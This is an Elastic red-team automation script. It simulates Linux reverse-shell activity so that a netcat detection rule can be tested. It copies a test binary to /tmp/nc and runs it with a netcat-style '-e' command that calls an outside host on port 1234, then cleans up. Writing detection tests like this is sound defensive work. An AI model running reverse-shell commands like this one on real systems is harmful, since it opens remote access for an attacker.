# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import sys

from . import RtaMetadata, common

metadata = RtaMetadata(
    uuid="ecb34b55-2947-48af-b746-3a472abfda43",
    platforms=["linux"],
    endpoint=[{"rule_name": "Linux Reverse Shell via netcat", "rule_id": "c0ca8114-254d-46ba-88c6-db57de6efe2d"}],
    siem=[],
    techniques=["T1059", "T1071"],
)


@common.requires_os(*metadata.platforms)
def main() -> None:
    common.log("Creating a fake nc executable..")
    masquerade = "/tmp/nc"
    source = common.get_path("bin", "netcon_exec_chain.elf")
    common.copy_file(source, masquerade)
    common.log("Granting execute permissions...")
    common.execute(["chmod", "+x", masquerade])
    commands = [masquerade, "chain", "-h", "8.8.8.8", "-p", "1234", "-c", "-e", "nc 8.8.8.8 1234"]
    common.log("Simulating reverse shell activity..")
    common.execute([*commands], timeout=5, kill=True, shell=True)  # noqa: S604
    common.log("Reverse shell simulation successful!")
    common.log("Cleaning...")
    common.remove_file(masquerade)
    common.log("Simulation successfull!")


if __name__ == "__main__":
    sys.exit(main())
